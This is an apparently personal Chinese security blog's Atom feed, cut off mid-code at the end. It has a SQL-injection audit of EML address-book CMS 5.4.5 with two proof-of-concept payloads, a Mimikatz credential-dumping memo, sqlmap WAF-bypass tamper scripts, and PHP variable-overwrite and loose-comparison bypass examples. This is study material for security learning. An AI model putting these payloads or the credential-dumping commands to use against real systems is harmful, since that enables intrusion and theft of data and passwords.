<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>sun1024</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2018-08-13T01:31:17.648Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>sun1024</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>EML企业通讯录管理系统两处注入分析</title>
    <link href="http://yoursite.com/2018/08/12/EML%E4%BC%81%E4%B8%9A%E9%80%9A%E8%AE%AF%E5%BD%95%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%B8%A4%E5%A4%84%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/"/>
    <id>http://yoursite.com/2018/08/12/EML企业通讯录管理系统两处注入分析/</id>
    <published>2018-08-12T12:38:02.459Z</published>
    <updated>2018-08-13T01:31:17.648Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>最近一直在用onenote整理笔记，结果发现博客已经荒了很久了，就把审过的漏洞贴上来吧。虽然没有什么技术含量，但总归是一点记录。</p><h1 id="0x01-漏洞环境"><a href="#0x01-漏洞环境" class="headerlink" title="0x01 漏洞环境"></a>0x01 漏洞环境</h1><p>CMS：EML企业通讯录管理系统</p><p>版本：5.4.5</p><p>官方网站：<a href="http://bbs.emlsoft.com" target="_blank" rel="external">http://bbs.emlsoft.com</a> </p><p>更新时间：2018.7.26 </p><p>测试环境：windows10+phpstudy+php5.5</p><h1 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h1><h3 id="过滤函数："><a href="#过滤函数：" class="headerlink" title="过滤函数："></a>过滤函数：</h3><p>对于小cms的sql注入的审计，一般存在两个方向：</p><ol><li>系统过滤机制的正面bypass;</li><li>过滤的盲区(如：GPC之外的注入、limit/orderby之后的注入、二次入库的注入以及忘记过滤的地方等.);</li></ol><p>当然，后者出现的概率更大并且也更好挖一点，先来看看过滤函数：</p><p>/lib/func.class.php:(27-37行)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//安全验证</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">_RunMagicQuotes</span><span class="params">(&amp;$svar)</span></span>&#123;</div><div class="line"><span class="keyword">if</span>(!get_magic_quotes_gpc())&#123;</div><div class="line"><span class="keyword">if</span>( is_array($svar) )&#123;</div><div class="line"><span class="keyword">foreach</span>($svar <span class="keyword">as</span> $k =&gt; $v) $svar[$k] = _RunMagicQuotes($v);</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line">$svar = addslashes($svar);</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"><span class="keyword">return</span> $svar;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>未开启GPC则使用addslashes，也考虑到了数组的情况。感觉只要使用得当，就应该没有什么问题。</p><h3 id="第一处注入："><a href="#第一处注入：" class="headerlink" title="第一处注入："></a>第一处注入：</h3><p>action/action.address.php：（60-68行）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"> <span class="comment">//设置分页</span></div><div class="line"><span class="keyword">if</span>($_POST[numPerPage]==<span class="string">""</span>)&#123;$numPerPage=<span class="string">"10"</span>;&#125;<span class="keyword">else</span>&#123;$numPerPage=$_POST[numPerPage];&#125;</div><div class="line"><span class="keyword">if</span>($_GET[pageNum]==<span class="string">""</span>||$_GET[pageNum]==<span class="string">"0"</span> )&#123;$pageNum=<span class="string">"0"</span>;&#125;<span class="keyword">else</span>&#123;$pageNum=($_GET[pageNum]<span class="number">-1</span>)*$numPerPage;&#125;</div><div class="line">$num=mysql_query(<span class="string">"select * from eml_address_list where 1=1 $search"</span>);<span class="comment">//当前频道条数</span></div><div class="line">$total=mysql_num_rows($num);<span class="comment">//总条数</span></div><div class="line">$page=<span class="keyword">new</span> page(<span class="keyword">array</span>(<span class="string">'total'</span>=&gt;$total,<span class="string">'perpage'</span>=&gt;$numPerPage));</div><div class="line"></div><div class="line"><span class="comment">//查询</span></div><div class="line">$sql=<span class="string">"select * from eml_address_list  where 1=1  $search order by id desc limit $pageNum,$numPerPage"</span>;</div></pre></td></tr></table></figure><p>$pageNum $numPerPage 未进行过滤处理直接带入了查询语句，但是前者应该无法利用：<code>（$pageNum=($_GET[pageNum]-1)*$numPerPage;）</code></p><p>后者位于limit中并且存在order by，(<a href="http://www.freebuf.com/articles/web/57528.html" target="_blank" rel="external">参考文章</a>)可使用如下利用方式。</p><p>POC：</p><p><code>numPerPage=1 procedure analyse(extractvalue(rand(),concat(0x7e,version())),0x7e);</code></p><p><img src="/images/sqli1.PNG" alt=""></p><h3 id="第二处注入："><a href="#第二处注入：" class="headerlink" title="第二处注入："></a>第二处注入：</h3><p>action/action.address.php：（186-206行)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//批量删除</span></div><div class="line"><span class="keyword">if</span>($do==<span class="string">"del_all"</span>)&#123;</div><div class="line">If_rabc($action,$do); <span class="comment">//检测权限</span></div><div class="line">is_admin($action,$do); <span class="comment">//检测权限</span></div><div class="line">$arr = $_POST[<span class="string">"item"</span>];</div><div class="line">$count_arr=count($arr); </div><div class="line"><span class="keyword">if</span>($count_arr==<span class="number">0</span>)&#123;</div><div class="line"><span class="keyword">echo</span> error($msg); </div><div class="line"><span class="keyword">exit</span>;</div><div class="line">&#125;</div><div class="line">$str = implode(<span class="string">"','"</span>,$arr);<span class="comment">//拼接字符</span></div><div class="line"></div><div class="line">$sql = <span class="string">"delete from eml_address_list WHERE id in('&#123;$str&#125;')"</span>;</div><div class="line"></div><div class="line"><span class="keyword">if</span>($db-&gt;query($sql))&#123;<span class="keyword">echo</span> success($msg,<span class="string">"?action=address"</span>);&#125;<span class="keyword">else</span>&#123;<span class="keyword">echo</span> error($msg);&#125;</div></pre></td></tr></table></figure><p>item参数通过POST方法传入，使用implode函数进行数组=&gt;字符串，然后未经过滤直接进入delete语句执行，同样是忘记使用过滤函数的问题，不同点是必须传入数组才能利用，当然此处检测了is_admin，需要后台权限才能利用，比上一处利用条件更苛刻。</p><p>POC:</p><p><code>item[]=2&#39;) or updatexml(1,concat(0x7e,(version())),0) -- dd</code></p><p><img src="/images/sqli2.PNG" alt=""></p><h1 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h1><p>感觉简单的太简单，难的又审不动，要走的路还很长呢。。。 </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;最近一直在用onenote整理笔记，结果发现博客已经荒了很久了，就把审过的漏洞贴上来吧。虽然没有什么
      
    
    </summary>
    
    
      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>Socks5_proxy</title>
    <link href="http://yoursite.com/2018/05/21/Socks5_proxy/"/>
    <id>http://yoursite.com/2018/05/21/Socks5_proxy/</id>
    <published>2018-05-21T03:35:39.121Z</published>
    <updated>2018-05-21T03:51:47.967Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Info："><a href="#Info：" class="headerlink" title="Info："></a>Info：</h1><p>毕业设计做出这么个东西，也是蛮水的。。。    </p><h1 id="Usage"><a href="#Usage" class="headerlink" title="Usage:"></a>Usage:</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">python Socks5_proxy.py       -- run on 1080</div><div class="line">python Socks5_proxy.py 2333  -- run on 2333</div></pre></td></tr></table></figure><h1 id="Test"><a href="#Test" class="headerlink" title="Test:"></a>Test:</h1><p><img src="/images/test1.PNG" alt=""></p><p><img src="/images/test2.PNG" alt=""></p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference:"></a>Reference:</h1><ul><li><a href="https://github.com/felix021/ssocks5/blob/master/ssocks5.py" target="_blank" rel="external">ssocks5</a></li><li><a href="https://github.com/RicterZ/reprocks/blob/master/server/reprocks_server.py" target="_blank" rel="external">repocks</a></li><li><a href="https://www.ietf.org/rfc/rfc1928.txt" target="_blank" rel="external">rfc1928</a><h1 id="Download"><a href="#Download" class="headerlink" title="Download:"></a>Download:</h1></li></ul><p><a href="https://github.com/sun1024/Socks5_proxy" target="_blank" rel="external">Socks5_proxy</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Info：&quot;&gt;&lt;a href=&quot;#Info：&quot; class=&quot;headerlink&quot; title=&quot;Info：&quot;&gt;&lt;/a&gt;Info：&lt;/h1&gt;&lt;p&gt;毕业设计做出这么个东西，也是蛮水的。。。    &lt;/p&gt;
&lt;h1 id=&quot;Usage&quot;&gt;&lt;a href=&quot;#Usag
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Some Sqlmap Tricks</title>
    <link href="http://yoursite.com/2017/08/19/Some%20Sqlmap%20Tricks/"/>
    <id>http://yoursite.com/2017/08/19/Some Sqlmap Tricks/</id>
    <published>2017-08-19T08:14:20.320Z</published>
    <updated>2017-09-15T06:44:20.322Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-–prefix-–suffix"><a href="#0x01-–prefix-–suffix" class="headerlink" title="0x01 –prefix,–suffix"></a>0x01 –prefix,–suffix</h2><p>在注入的payload的前面或者后面加一些字符, 使sql语句能正常拼接:</p><p><code>--prefix &quot;xxx&quot; --suffix &quot;xxx&quot;</code></p><h2 id="0x02-–start-–stop"><a href="#0x02-–start-–stop" class="headerlink" title="0x02 –start –stop"></a>0x02 –start –stop</h2><p>表中的数据量过多, 或者盲注太费时间, 使用–start,–stop指定几行数据:</p><p><code>--start num1 --stop num2</code></p><h2 id="0x03-–search"><a href="#0x03-–search" class="headerlink" title="0x03 –search"></a>0x03 –search</h2><p>寻找特定的数据库名，所有数据库中的特定表名，所有数据库表中的特定字段:</p><p><code>--search -C sfzh</code></p><h2 id="0x04-–count"><a href="#0x04-–count" class="headerlink" title="0x04 –count"></a>0x04 –count</h2><p>只获取表中的数据个数:</p><p><code>--count -D testDB</code></p><h2 id="0x05-一些tamper"><a href="#0x05-一些tamper" class="headerlink" title="0x05 一些tamper"></a>0x05 一些tamper</h2><p>如果web应用使用asp/asp.net开发，charunicodeencode.py和percentage.py可以绕过Waf。</p><p><code>--tamepr=charunicodeencode</code><br><code>--tamepr=percentage</code></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://119.29.64.123:8080/WooyunDrops/#!/drops/25.sqlmap%E7%94%A8%E6%88%B7%E6%89%8B%E5%86%8C" target="_blank" rel="external">sqlmap用户手册</a><br><a href="http://www.freebuf.com/articles/1000.html" target="_blank" rel="external">如何使用SQLMap绕过WAF</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x01-–prefix-–suffix&quot;&gt;&lt;a href=&quot;#0x01-–prefix-–suffix&quot; class=&quot;headerlink&quot; title=&quot;0x01 –prefix,–suffix&quot;&gt;&lt;/a&gt;0x01 –prefix,–suffix&lt;/h2&gt;&lt;
      
    
    </summary>
    
    
      <category term="Sqlmap" scheme="http://yoursite.com/tags/Sqlmap/"/>
    
  </entry>
  
  <entry>
    <title>Mimikatz简单使用（备忘）</title>
    <link href="http://yoursite.com/2017/04/28/Mimikatz%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8%EF%BC%88%E5%A4%87%E5%BF%98%EF%BC%89/"/>
    <id>http://yoursite.com/2017/04/28/Mimikatz简单使用（备忘）/</id>
    <published>2017-04-28T09:45:23.228Z</published>
    <updated>2017-04-28T10:07:42.948Z</updated>
    
    <content type="html"><![CDATA[<ul><li>下载地址：<br><a href="https://github.com/gentilkiwi/mimikatz/releases/latest" target="_blank" rel="external">Mimikatz</a></li><li><p>简单使用：</p><ul><li>step1:<br>以管理员身份运行mimikatz.exe<br>(根据计算机系统选择相应版本)</li><li><p>step2:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">privilege::debug</div><div class="line"></div><div class="line">#提升权限</div></pre></td></tr></table></figure></li><li><p>step3:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">sekurlsa::logonpasswords</div><div class="line"></div><div class="line">#获取密码</div></pre></td></tr></table></figure></li></ul></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;ul&gt;
&lt;li&gt;下载地址：&lt;br&gt;&lt;a href=&quot;https://github.com/gentilkiwi/mimikatz/releases/latest&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Mimikatz&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;简
      
    
    </summary>
    
    
      <category term="Mimikatz" scheme="http://yoursite.com/tags/Mimikatz/"/>
    
  </entry>
  
  <entry>
    <title>firefox更换中文语言包</title>
    <link href="http://yoursite.com/2017/04/07/firefox%E6%9B%B4%E6%8D%A2%E4%B8%AD%E6%96%87%E8%AF%AD%E8%A8%80%E5%8C%85/"/>
    <id>http://yoursite.com/2017/04/07/firefox更换中文语言包/</id>
    <published>2017-04-07T10:38:10.012Z</published>
    <updated>2017-04-07T10:50:04.605Z</updated>
    
    <content type="html"><![CDATA[<p>记录一下，免得下次再去网上搜</p><ul><li>中文语言包下载地址：<br><code>http://ftp.mozilla.org/pub/mozilla.org/firefox/releases/27.0.1/win32/xpi/zh-CN.xpi</code><br>(版本号:27.0.1/操作系统：win32)</li><li><p>在FireFox地址栏里输入”about:config”。</p></li><li><p>然后在过滤器里输入general.useragent.locale，双击然后在弹出的对话框里输入”zh-CN”。</p></li><li><p>重启，更换成功。</p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;记录一下，免得下次再去网上搜&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;中文语言包下载地址：&lt;br&gt;&lt;code&gt;http://ftp.mozilla.org/pub/mozilla.org/firefox/releases/27.0.1/win32/xpi/zh-CN.xpi&lt;/code&gt;
      
    
    </summary>
    
    
      <category term="firefox" scheme="http://yoursite.com/tags/firefox/"/>
    
  </entry>
  
  <entry>
    <title>pip修改官方源踩的坑</title>
    <link href="http://yoursite.com/2017/03/29/pip%E4%BF%AE%E6%94%B9%E5%AE%98%E6%96%B9%E6%BA%90%E8%B8%A9%E7%9A%84%E5%9D%91/"/>
    <id>http://yoursite.com/2017/03/29/pip修改官方源踩的坑/</id>
    <published>2017-03-29T03:07:04.213Z</published>
    <updated>2017-03-29T04:00:46.315Z</updated>
    
    <content type="html"><![CDATA[<h2 id="linux篇："><a href="#linux篇：" class="headerlink" title="linux篇："></a>linux篇：</h2><ul><li>编辑配置文件（如果没有, 新建一份）：<br><code>vi ~/.pip/pip.conf</code></li><li><p>在配置文件内加上（这里使用豆瓣源）:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">[global]</div><div class="line">index-url = http://pypi.douban.com/simple</div><div class="line">trusted-host = pypi.douban.com</div></pre></td></tr></table></figure></li><li><p>然后就可以愉快地：<br><code>pip install xxxxx</code></p></li></ul><h2 id="windows篇（比较奇葩）："><a href="#windows篇（比较奇葩）：" class="headerlink" title="windows篇（比较奇葩）："></a>windows篇（比较奇葩）：</h2><ul><li>新建文件（pip文件夹与pip.ini都要自己新建）：<br><code>C:\Users\用户名\pip\pip.ini</code><br>注意：不是C:\Users\用户名\AppData\Local\pip下的 pip.ini</li><li><p>在配置文件内加上（这里使用豆瓣源）:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">[global]</div><div class="line">index-url = http://pypi.douban.com/simple</div><div class="line">trusted-host = pypi.douban.com</div></pre></td></tr></table></figure></li><li><p>然后就可以愉快地：<br><code>pip install xxxxx</code></p></li></ul><h2 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h2><p><a href="https://www.v2ex.com/t/291817" target="_blank" rel="external">https://www.v2ex.com/t/291817</a><br><a href="https://ficapy.github.io/2013/12/27/pip_use_china_mirror/" target="_blank" rel="external">https://ficapy.github.io/2013/12/27/pip_use_china_mirror/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;linux篇：&quot;&gt;&lt;a href=&quot;#linux篇：&quot; class=&quot;headerlink&quot; title=&quot;linux篇：&quot;&gt;&lt;/a&gt;linux篇：&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;编辑配置文件（如果没有, 新建一份）：&lt;br&gt;&lt;code&gt;vi ~/.pip/pip.c
      
    
    </summary>
    
    
      <category term="python" scheme="http://yoursite.com/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>sqlmap扩展tamper及其简单编写</title>
    <link href="http://yoursite.com/2017/03/22/sqlmap%E6%89%A9%E5%B1%95tamper%E5%8F%8A%E5%85%B6%E7%AE%80%E5%8D%95%E7%BC%96%E5%86%99/"/>
    <id>http://yoursite.com/2017/03/22/sqlmap扩展tamper及其简单编写/</id>
    <published>2017-03-22T04:54:48.702Z</published>
    <updated>2018-05-24T04:38:47.305Z</updated>
    
    <content type="html"><![CDATA[<h2 id="常见tamper-搜集自网络-："><a href="#常见tamper-搜集自网络-：" class="headerlink" title="常见tamper(搜集自网络)："></a>常见tamper(搜集自网络)：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line">apostrophemask.py 用UTF-8全角字符替换单引号字符</div><div class="line">apostrophenullencode.py 用非法双字节unicode字符替换单引号字符</div><div class="line">appendnullbyte.py 在payload末尾添加空字符编码</div><div class="line">base64encode.py 对给定的payload全部字符使用Base64编码</div><div class="line">between.py 分别用“NOT BETWEEN 0 AND #”替换大于号“&gt;”，“BETWEEN # AND #”替换等于号“=”</div><div class="line">bluecoat.py 在SQL语句之后用有效的随机空白符替换空格符，随后用“LIKE”替换等于号“=”</div><div class="line">chardoubleencode.py 对给定的payload全部字符使用双重URL编码（不处理已经编码的字符）</div><div class="line">charencode.py 对给定的payload全部字符使用URL编码（不处理已经编码的字符）</div><div class="line">charunicodeencode.py 对给定的payload的非编码字符使用Unicode URL编码（不处理已经编码的字符）</div><div class="line">concat2concatws.py 用“CONCAT_WS(MID(CHAR(0), 0, 0), A, B)”替换像“CONCAT(A, B)”的实例</div><div class="line">equaltolike.py  用“LIKE”运算符替换全部等于号“=”</div><div class="line">greatest.py  用“GREATEST”函数替换大于号“&gt;”</div><div class="line">halfversionedmorekeywords.py 在每个关键字之前添加MySQL注释</div><div class="line">ifnull2ifisnull.py 用“IF(ISNULL(A), B, A)”替换像“IFNULL(A, B)”的实例</div><div class="line">lowercase.py 用小写值替换每个关键字字符</div><div class="line">modsecurityversioned.py 用注释包围完整的查询</div><div class="line">modsecurityzeroversioned.py 用当中带有数字零的注释包围完整的查询</div><div class="line">multiplespaces.py 在SQL关键字周围添加多个空格</div><div class="line">nonrecursivereplacement.py 用representations替换预定义SQL关键字，适用于过滤器</div><div class="line">overlongutf8.py 转换给定的payload当中的所有字符</div><div class="line">percentage.py 在每个字符之前添加一个百分号</div><div class="line">randomcase.py 随机转换每个关键字字符的大小写</div><div class="line">randomcomments.py 向SQL关键字中插入随机注释</div><div class="line">securesphere.py 添加经过特殊构造的字符串</div><div class="line">sp_password.py 向payload末尾添加“sp_password” for automatic obfuscation from DBMS logs</div><div class="line">space2comment.py 用“/**/”替换空格符</div><div class="line">space2dash.py 用破折号注释符“--”其次是一个随机字符串和一个换行符替换空格符</div><div class="line">space2hash.py 用磅注释符“#”其次是一个随机字符串和一个换行符替换空格符</div><div class="line">space2morehash.py 用磅注释符“#”其次是一个随机字符串和一个换行符替换空格符</div><div class="line">space2mssqlblank.py 用一组有效的备选字符集当中的随机空白符替换空格符</div><div class="line">space2mssqlhash.py 用磅注释符“#”其次是一个换行符替换空格符</div><div class="line">space2mysqlblank.py 用一组有效的备选字符集当中的随机空白符替换空格符</div><div class="line">space2mysqldash.py 用破折号注释符“--”其次是一个换行符替换空格符</div><div class="line">space2plus.py 用加号“+”替换空格符</div><div class="line">space2randomblank.py 用一组有效的备选字符集当中的随机空白符替换空格符</div><div class="line">unionalltounion.py 用“UNION SELECT”替换“UNION ALL SELECT”</div><div class="line">unmagicquotes.py 用一个多字节组合%bf%27和末尾通用注释一起替换空格符</div><div class="line">varnish.py 添加一个HTTP头“X-originating-IP”来绕过WAF</div><div class="line">versionedkeywords.py 用MySQL注释包围每个非函数关键字</div><div class="line">versionedmorekeywords.py 用MySQL注释包围每个关键字</div><div class="line">xforwardedfor.py 添加一个伪造的HTTP头“X-Forwarded-For”来绕过WAF</div></pre></td></tr></table></figure><h2 id="tamper的简单编写："><a href="#tamper的简单编写：" class="headerlink" title="tamper的简单编写："></a>tamper的简单编写：</h2><p>栗子：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># sqlmap/tamper/yourtamper.py</span></div><div class="line"></div><div class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</div><div class="line"></div><div class="line"><span class="comment">#定义脚本的优先级，用于有多个tamper脚本的情况</span></div><div class="line">__priority__ = PRIORITY.LOWEST </div><div class="line"></div><div class="line"><span class="comment">#声明该脚本适用/不适用的范围，可以为空</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">dependencies</span><span class="params">()</span>:</span></div><div class="line"><span class="keyword">pass</span> </div><div class="line"></div><div class="line"><span class="comment">#主要函数，接受的参数为payload和**kwargs返回值为替换后的payload</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span><span class="params">(payload, **kwargs)</span>:</span></div><div class="line">    <span class="keyword">return</span> payload.replace(<span class="string">"."</span>, <span class="string">"\\."</span>)</div></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;常见tamper-搜集自网络-：&quot;&gt;&lt;a href=&quot;#常见tamper-搜集自网络-：&quot; class=&quot;headerlink&quot; title=&quot;常见tamper(搜集自网络)：&quot;&gt;&lt;/a&gt;常见tamper(搜集自网络)：&lt;/h2&gt;&lt;figure class=&quot;hi
      
    
    </summary>
    
    
      <category term="web安全" scheme="http://yoursite.com/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>php变量覆盖的学习</title>
    <link href="http://yoursite.com/2017/03/14/php%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E7%9A%84%E5%AD%A6%E4%B9%A0/"/>
    <id>http://yoursite.com/2017/03/14/php变量覆盖的学习/</id>
    <published>2017-03-14T11:01:47.927Z</published>
    <updated>2017-03-22T05:17:56.845Z</updated>
    
    <content type="html"><![CDATA[<h1 id="关于php变量覆盖漏洞："><a href="#关于php变量覆盖漏洞：" class="headerlink" title="关于php变量覆盖漏洞："></a>关于php变量覆盖漏洞：</h1><p>关注函数：extract(),parse_str(),$$,import_request_varables(),etc.</p><h2 id="extract"><a href="#extract" class="headerlink" title="extract():"></a>extract():</h2><p>栗子:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> </div><div class="line">$a = <span class="number">2333</span>;</div><div class="line">@extract($_GET);</div><div class="line">print_r($a);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p><p>payload:<br><code>?a=1//即可覆盖$a</code></p><h2 id="parse-str"><a href="#parse-str" class="headerlink" title="parse_str():"></a>parse_str():</h2><p>栗子:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$a=<span class="number">2333</span>;</div><div class="line">parse_str($_SERVER[<span class="string">'QUERY_STRING'</span>]);</div><div class="line"><span class="keyword">print</span> $a;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p><p>payload:<br><code>?a=1//即可覆盖$a</code></p><h2 id=""><a href="#" class="headerlink" title="$$:"></a>$$:</h2><p>栗子:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> </div><div class="line">$a = <span class="number">2333</span>;</div><div class="line"><span class="keyword">foreach</span>(<span class="keyword">array</span>(<span class="string">'_COOKIE'</span>,<span class="string">'_POST'</span>,<span class="string">'_GET'</span>) <span class="keyword">as</span> $_request)&#123;</div><div class="line"><span class="keyword">foreach</span>($$_request <span class="keyword">as</span> $_key=&gt;$_value)&#123;</div><div class="line">$$_key = addslashes($_value);</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">print_r($a)</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p><p>payload:<br><code>?a=1//即可覆盖$a</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;关于php变量覆盖漏洞：&quot;&gt;&lt;a href=&quot;#关于php变量覆盖漏洞：&quot; class=&quot;headerlink&quot; title=&quot;关于php变量覆盖漏洞：&quot;&gt;&lt;/a&gt;关于php变量覆盖漏洞：&lt;/h1&gt;&lt;p&gt;关注函数：extract(),parse_str(),$$,
      
    
    </summary>
    
    
      <category term="php" scheme="http://yoursite.com/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>关于php比较运算符</title>
    <link href="http://yoursite.com/2017/02/28/%E5%85%B3%E4%BA%8Ephp%E6%AF%94%E8%BE%83%E8%BF%90%E7%AE%97%E7%AC%A6/"/>
    <id>http://yoursite.com/2017/02/28/关于php比较运算符/</id>
    <published>2017-02-28T10:10:50.804Z</published>
    <updated>2017-04-02T02:07:15.185Z</updated>
    
    <content type="html"><![CDATA[<h1 id="比较运算符”-”与”-”的学习："><a href="#比较运算符”-”与”-”的学习：" class="headerlink" title="比较运算符”==”与”===”的学习："></a>比较运算符”==”与”===”的学习：</h1><h2 id="关于”-”的绕过："><a href="#关于”-”的绕过：" class="headerlink" title="关于”==”的绕过："></a>关于”==”的绕过：</h2><p>0e开头的全部相等<br>栗子:<br><code>md5(&#39;240610708&#39;) == md5(&#39;QNKCDZO&#39;)</code><br><code>md5(&#39;aabg7XSs&#39;) == md5(&#39;aabC9RqS&#39;)</code><br><code>sha1(&#39;aaroZmOk&#39;) == sha1(&#39;aaK1STfY&#39;)</code><br><code>sha1(&#39;aaO8zKZF&#39;) == sha1(&#39;aa3OFF9m&#39;)</code><br><code>&#39;0010e2&#39; == &#39;1e3&#39;</code><br><code>&#39;0x1234Ab&#39; == &#39;1193131&#39;</code><br><code>&#39;0xABCdef&#39; == &#39;     0xABCdef&#39;</code><br>一道简单的CTF题目：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$key = <span class="string">"llocdpocuzion5dcp2bindhspiccy"</span>;</div><div class="line">$flag = strcmp($key, $_GET[<span class="string">'key'</span>]);</div><div class="line"><span class="keyword">if</span> ($flag == <span class="number">0</span>) 